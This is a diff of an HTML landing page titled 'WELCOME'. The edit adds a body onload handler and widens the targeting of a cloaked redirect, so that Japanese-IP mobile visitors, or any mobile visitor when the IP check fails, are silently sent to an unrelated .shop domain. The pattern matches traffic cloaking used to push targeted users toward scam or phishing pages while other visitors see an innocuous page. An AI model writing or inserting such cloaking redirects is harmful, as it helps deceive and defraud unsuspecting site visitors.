@@ -2,13 +2,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-	 
+	 <!--
 	<script>
 		window.onload = function() {
 			window.location.href = "https://www.mka610rea.shop/nk99/index.html";
 		}
 	</script>
-    
+    -->
 
   <title>WELCOME</title>
   <meta charset="utf-8">
@@ -35,7 +35,7 @@
         content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 </head>
 	 
-  <body >
+  <body onload="handleResponse()">
  
 <script>
   function handleResponse() {
@@ -52,7 +52,7 @@ function isJapaneseLang() {
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice() && isJapaneseLang()) {
+        if (data.country === 'JP' && isMobileDevice() ) {
           window.location.href = "https://www.mka610rea.shop/nk99/index.html";
           return;
         }
@@ -66,7 +66,7 @@ function isJapaneseLang() {
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isJapaneseLang()) {
+        if (isMobileDevice() ) {
           window.location.href = "https://www.mka610rea.shop/nk99/index.html";
           return;
         }
